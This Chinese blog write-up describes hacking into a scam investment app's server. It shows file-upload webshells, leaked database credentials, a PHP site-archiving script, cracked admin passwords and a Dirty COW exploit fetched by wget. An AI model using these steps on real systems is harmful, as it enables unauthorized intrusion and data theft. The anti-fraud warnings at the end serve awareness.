所谓“杀猪盘”，是指诈骗分子利用网络交友通常是“异性”交友，诱导受害人下载诈骗APP并在上面进行各种“投资”，如菠菜、股票、期货甚至虚拟货币的网络诈骗。今年某月某日`小白`就遭遇了这种骗局，他先是被骗子通过QQ添加并下载了一个名为”心动“的APP，在“心动“APP上结识了位名为“xx老师”的美女，`小白`被美色迷了眼打算相约这名网友，但是美女则借口让他下载另一个名为午夜乐园的APP进行投资，果不其然`小白`被成功骗取10余万。

## 0x01 APP测试准备

根据`小白`的描述，我们关注到以下几点信息，分别是
QQ、“心动”APP以及“午夜乐园”APP，但是`小白`因不堪被骗将骗子QQ删除了。所以我们无法从QQ号这点进行入手，但是这两个APP的APK包倒是存在，于是开始渗透分析。

### 安装APP

使用夜神模拟器安装这两个APP，为了方便起见就使用安卓5.0版本，否则无法抓取到 https 数据包

> 小知识：从 Android 7.0 开始，默认的网络安全性配置修改，默认不再信任用户添加的 CA 证书，也就不再信任抓包工具的证书

![image](https://image.3001.net/images/20211216/1639615976_61ba8de8cab7174ea29a2.png!small)  
因为“午夜乐园”APP需要邀请码才能注册，所以我们先安装“心动”APP  
![image](https://image.3001.net/images/20211216/1639615918_61ba8dae88d088bf54c90.png!small)

### 设置抓包

在 BurpSuite 中设置监听地址以及监听端口，其中地址为内网的IP地址  
![image](https://image.3001.net/images/20211216/1639615994_61ba8dfa3daa038cf6063.png!small)  
设置网络中的 HTTP 代理为 BurpSuite 中的代理地址和端口  
![image](https://image.3001.net/images/20211216/1639616008_61ba8e088683ca8c63926.png!small)  
访问百度，在 Burp Suite 中成功抓取到数据包  
![image](https://image.3001.net/images/20211216/1639616019_61ba8e13225a78270c346.png!small)  
现在针对 http 协议的数据包都可以抓取到了

### 安装证书

接下来为了抓取到 https 的数据包，我们需要为其安装 CA 证书  
![image](https://image.3001.net/images/20211216/1639616030_61ba8e1ea5482d01a66ab.png!small)  
访问`https://burp`点击`CA`开始下载证书，下载完成后在`设置`中找到`安全`  
![image](https://image.3001.net/images/20211216/1639616042_61ba8e2a089eabb1a6448.png!small)  
选择`从SD卡安装`  
![image](https://image.3001.net/images/20211216/1639616054_61ba8e36892c624a2263f.png!small)  
选择之前下载的证书并为证书命名  
![image](https://image.3001.net/images/20211216/1639616068_61ba8e44027bb04177073.png!small)  
在`用户凭据`中已存在证书  
![image](https://image.3001.net/images/20211216/1639616079_61ba8e4f0f75c6230a7e0.png!small)  
访问`https://www.baidu.com`  
![image](https://image.3001.net/images/20211216/1639616090_61ba8e5ac05b7bf4a20ae.png!small)  
在 Burp Suite 中成功抓取到 https 数据包  
![image](https://image.3001.net/images/20211216/1639615810_61ba8d42c5833107f1f99.png!small)

## 0x02 上线shell

### 初探上传漏洞

在APP中注册一个测试账号  
![image](https://image.3001.net/images/20211216/1639616115_61ba8e73b38b43981e1c5.png!small)  
发现在`发布动态`处存在文件上传  
![image](https://image.3001.net/images/20211216/1639616128_61ba8e809059b5ce0b5fc.png!small)  
使用 Burp Suite 截取数据包，测试后发现目标站点只返回0或1  
![image](https://image.3001.net/images/20211216/1639616140_61ba8e8c663612064c952.png!small)  
上传后在朋友圈界面发现该功能正常，那么对应的图片路径在哪呢？  
![image](https://image.3001.net/images/20211216/1639616154_61ba8e9a79de921fb8b77.png!small)  
通过抓包发现该图片的具体地址  
![image](https://image.3001.net/images/20211216/1639616168_61ba8ea84638ce1713ed9.png!small)  
修改数据包将其文件名后缀修改为php时则无法上传，可能存在防护机制  
![image](https://image.3001.net/images/20211216/1639616178_61ba8eb2b34a860c8a97e.png!small)

### 文件上传漏洞获取webshell

尝试了几种绕过方式无果后，在朋友圈背景图片发现文件上传点，将冰蝎上传  
![image](https://image.3001.net/images/20211216/1639616191_61ba8ebf2fade4e4fa151.png!small)  
幸运的是目标直接返回了木马地址，使用冰蝎连接目标  
![image](https://image.3001.net/images/20211216/1639616202_61ba8ecaf221db98f48fc.png!small)  
至此 webshell 成功上线，但可惜的是这是 docker 环境。同时为了维持对目标站点的控制，继续上传了一个哥斯拉马  
![image](https://image.3001.net/images/20211216/1639616215_61ba8ed77975a6ce9cefa.png!small)

## 0x03 信息收集

### 查看当前环境

查看当前用户为普通的 www 用户，能够执行一些简单的命令  
![image](https://image.3001.net/images/20211216/1639616229_61ba8ee59ffce60d6becb.png!small)  
查看文件管理，发现网站下存在 thinkphp 框架，开始寻找配置文件  
![image](https://image.3001.net/images/20211216/1639616241_61ba8ef1d78dbfd5300dc.png!small)

### 数据库登录

在配置文件中发现数据库连接文件

    
    
    return [
        // 数据库类型
        'type'            => Env::get('database.type', 'mysql'),
        // 服务器地址
        'hostname'        => Env::get('database.hostname', '192.168.0.59'),
        // 数据库名
        'database'        => Env::get('database.database', 'netchat'),
        // 用户名
        'username'        => Env::get('database.username', 'root'),
        // 密码
        'password'        => Env::get('database.password', 'MysqlNetchatPWD#'),
        // 端口
        'hostport'        => Env::get('database.hostport', '3305'),
    ];
    

由于无法通过冰蝎无法连接数据库，我们上传 adminer 连接数据库，将服务器地址设置为`192.168.0.59:3305`，输入账号和密码  
![image](https://image.3001.net/images/20211216/1639616258_61ba8f02259e55b39f936.png!small)  
在 adminer 中选择数据库导出，将当前数据库直接打包下载  
![image](https://image.3001.net/images/20211216/1639616271_61ba8f0ff2778d610fc54.png!small)

### 后台地址与账号密码

在数据库中还有些意外收获，里面包含了一些管理员的账号密码  
![image](https://image.3001.net/images/20211216/1639616305_61ba8f31e4f4722f0c67c.png!small)  
经过解密后发现 admin666 密码为123456  
![image](https://image.3001.net/images/20211216/1639616322_61ba8f428e339ec60b354.png!small)  
查看 admin_log 表后发现登录地址为`https://xx.xx.xx.xx/adim888/index/login`  
![image](https://image.3001.net/images/20211216/1639616338_61ba8f526f160fd789525.png!small)  
访问后为如下界面，我们只需要输入账号密码与谷歌验证码即可登录，为了不打草精神未直接登录后台。  
![image](https://image.3001.net/images/20211216/1639616358_61ba8f66bbe3111db6b95.png!small)

### 打包网站

接下来为了方便分析，使用如下脚本打包整个网站进行下载

    
    
    <?php
     
    error_reporting(0);
     
    class PHPZip{
        var $dirInfo = array("0","0");
        var $datasec = array();
        var $ctrl_dir = array();
        var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
        var $old_offset   = 0;
     
        function createZip($dir, $zipfilename){
            if (@function_exists('gzcompress')){
                @set_time_limit("0");
                if (is_array($dir)){
                    $fd = fopen ($dir, "r");
                    $fileValue = fread ($fd, filesize ($filename));
                    fclose ($fd);
                    if (is_array($dir)) $filename = basename($dir);
                    $this -> addFile($fileValue, "$filename");
                }else{
                    $this->dirTree($dir,$dir);
                }
     
                $out = $this -> filezip();
                $fp = fopen($zipfilename, "w");
                fwrite($fp, $out, strlen($out));
                fclose($fp);
                $filesize = filesize($zipfilename);
     
                if ($filesize < 104857600) {
                    echo "create zip success!";
                } else {
                    echo "create zip error!";
                }        }
         }
     
        //get dir tree..
        function dirTree($directory,$rootDir){
            $fileDir = $rootDir;
            $myDir = dir($directory);
            while($file=$myDir->read()){
                if(is_dir("$directory/$file") and $file!="." and $file!=".."){
                    $this->dirInfo[0]++;
                    $rootDir ="$fileDir$file/";
                    $this -> addFile('', "$rootDir");
     
                    //go on n's folders
                    $this->dirTree("$directory/$file",$rootDir);
                }else{
                    if($file!="." and $file!=".."){
                        $this->dirInfo[1]++;
                        $fileValue = file_get_contents("$directory/$file");
                        $this -> addFile($fileValue, "$fileDir$file");
                    }
                }
            }
            $myDir->close();
        }
     
        function unix2DosTime($unixtime = 0) {
            $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
     
            if ($timearray['year'] < 1980) {
                 $timearray['year'] = 1980;
                 $timearray['mon'] = 1;
                 $timearray['mday'] = 1;
                 $timearray['hours'] = 0;
                 $timearray['minutes'] = 0;
                 $timearray['seconds'] = 0;
            } // end if
     
            return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                    ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
        }
     
        function addFile($data, $name, $time = 0){
            $name = str_replace('\\', '/', $name);
     
            $dtime = dechex($this->unix2DosTime($time));
            $hexdtime = '\x' . $dtime[6] . $dtime[7]
                      . '\x' . $dtime[4] . $dtime[5]
                      . '\x' . $dtime[2] . $dtime[3]
                      . '\x' . $dtime[0] . $dtime[1];
            eval('$hexdtime = "' . $hexdtime . '";');
     
            $fr = "\x50\x4b\x03\x04";
            $fr .= "\x14\x00";            // ver needed to extract
            $fr .= "\x00\x00";            // gen purpose bit flag
            $fr .= "\x08\x00";            // compression method
            $fr .= $hexdtime;             // last mod time and date
     
            // "local file header" segment
            $unc_len = strlen($data);
            $crc = crc32($data);
            $zdata = gzcompress($data);
            $c_len = strlen($zdata);
            $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2); // fix crc bug
            $fr .= pack('V', $crc);             // crc32
            $fr .= pack('V', $c_len);           // compressed filesize
            $fr .= pack('V', $unc_len);         // uncompressed filesize
            $fr .= pack('v', strlen($name));    // length of filename
            $fr .= pack('v', 0);                // extra field length
            $fr .= $name;
     
            // "file data" segment
            $fr .= $zdata;
     
            // "data descriptor" segment (optional but necessary if archive is not
            // served as file)
            $fr .= pack('V', $crc);                 // crc32
            $fr .= pack('V', $c_len);               // compressed filesize
            $fr .= pack('V', $unc_len);             // uncompressed filesize
     
            // add this entry to array
            $this -> datasec[] = $fr;
            $new_offset        = strlen(implode('', $this->datasec));
     
            // now add to central directory record
            $cdrec = "\x50\x4b\x01\x02";
            $cdrec .= "\x00\x00";                // version made by
            $cdrec .= "\x14\x00";                // version needed to extract
            $cdrec .= "\x00\x00";                // gen purpose bit flag
            $cdrec .= "\x08\x00";                // compression method
            $cdrec .= $hexdtime;                 // last mod time & date
            $cdrec .= pack('V', $crc);           // crc32
            $cdrec .= pack('V', $c_len);         // compressed filesize
            $cdrec .= pack('V', $unc_len);       // uncompressed filesize
            $cdrec .= pack('v', strlen($name) ); // length of filename
            $cdrec .= pack('v', 0 );             // extra field length
            $cdrec .= pack('v', 0 );             // file comment length
            $cdrec .= pack('v', 0 );             // disk number start
            $cdrec .= pack('v', 0 );             // internal file attributes
            $cdrec .= pack('V', 32 );            // external file attributes - 'archive' bit set
     
            $cdrec .= pack('V', $this -> old_offset ); // relative offset of local header
            $this -> old_offset = $new_offset;
     
            $cdrec .= $name;
     
            // optional extra field, file comment goes here
            // save to central directory
            $this -> ctrl_dir[] = $cdrec;
        }
     
        function filezip(){
            $data = implode('', $this -> datasec);
            $ctrldir = implode('', $this -> ctrl_dir);
     
            return
                $data .
                $ctrldir .
                $this -> eof_ctrl_dir .
                pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries "on this disk"
                pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries overall
                pack('V', strlen($ctrldir)) .           // size of central dir
                pack('V', strlen($data)) .              // offset to start of central dir
                "\x00\x00";                             // .zip file comment length
        }
    }
     
    $zip = new PHPZip(); 
    $path = $_GET['path'];
    $filename = $_GET['filename'];
    if (isset($path)&&isset($filename)) {
        $zip -> createZip($path, $filename);
    } else {
        echo "please input correct path and filename, like <a href=#>http://example.com?path=/home&filename=home.zip</a>";
    }
     
    ?>
    

### IP地址查询

通过简单的sql语句对 admin 登录日志进行查询

    
    
    select distinct ip from yl_admin_log limit 50
    

![image](https://image.3001.net/images/20211216/1639616386_61ba8f82416bacb1b2e5d.png!small)  
发现该站点的登录IP都是国外的IP，猜测网站管理员都是通过代理或本身就在国外访问的后台  
![image](https://image.3001.net/images/20211216/1639616397_61ba8f8da1eb579c6c0c3.png!small)  
而查询 yl_core_ip 表中发现了一个IP  
![image](https://image.3001.net/images/20211216/1639616415_61ba8f9f05c6d971f1e91.png!small)  
查询微步后，该IP已经被打上了恶意地址标签  
![image](https://image.3001.net/images/20211216/1639616426_61ba8faac54424ccefb2b.png!small)

## 0x04 权限提升

由于当前权限比较低，我们也需要拿到 docker 环境下的 root 权限，但是我没有提权成功，自然也无法利用 docker
逃逸来跳到其真实环境下。这里演示下我使用脏牛提权的失败记录吧。

### 系统信息收集

    
    
    uname -a
    cat /etc/issue
    

![image](https://image.3001.net/images/20211216/1639616443_61ba8fbb1ef59e1564cfb.png!small)  
当前系统为 Debian GNU/Linux 10

### 漏洞查询

上传`linuxenum`和`linux-exploit-suggestor`，赋予执行权限并执行

    
    
    chmod 777 linuxenum.sh
    chmod 777 linux-exploit-suggestor.sh
    

![image](https://image.3001.net/images/20211216/1639616456_61ba8fc88c3bc65bbeef2.png!small)  
![image](https://image.3001.net/images/20211216/1639616469_61ba8fd5ae9a832449958.png!small)

### 脏牛提权

通过 linux-exploit-suggestor 返回的结果，其中存在脏牛漏洞

    
    
    wget https://www.exploit-db.com/download/40616 ##这里我直接上传了
    mv 40616 cowroot.c
    ## 正式从这开始
    gcc cowroot.c -o cowroot -pthread
    chmod +x cowroot
    ./cowroot
    

失败过程就不截图了

## 0x05 受骗分析及警示

### 登录客服查看聊天记录

在数据库中还有相关客服用户的账号密码，直接解码后面的 base64 编码就可以获取到明文  
![image](https://image.3001.net/images/20211216/1639616487_61ba8fe77941083f83207.png!small)  
登录几个客服用户进行查看  
![image](https://image.3001.net/images/20211216/1639616502_61ba8ff6572a75290e4d6.png!small)

### 杀猪盘流程

这里我们也根据`小白`的注册时间找到了它的账号，为q123456x  
![image](https://image.3001.net/images/20211216/1639616517_61ba9005e8edc47fc3bba.png!small)  
通过注册IP确认该用户为受害人账号。但是尝试登录后发现该用户已经被锁定，在数据库中发现该用户的islogin为0，修改为1后还是无法登录，通过查看管理员的操作记录，发现其一直在封锁账号。  
![image](https://image.3001.net/images/20211216/1639616531_61ba901362a224bcb93b3.png!small)  
再根据几个客服的聊天记录，我们总结了”杀猪盘“流程

    
    
    1、招揽有“交友”目的的年轻人
    2、通过客服为其提供“服务”
    3、安排”漂亮姐姐“骗取年轻人投资
    4、年轻人欲望上头开始投资
    5、最终被骗人财两空
    

### 警示

1、警惕在私聊中呈现的完美对象，完美人设往往就是诱饵  
2、切勿和陌生人谈钱、一起投资，记住，网上“对象”也是陌生人  
3、切勿下载安装网上各类投资菠菜APP链接，不要在未验证网站投资  
4、不向未验证的陌生账户转账汇款  
5、不要参与网上菠菜，涉嫌违法。  
6、不要被欲望冲昏了头

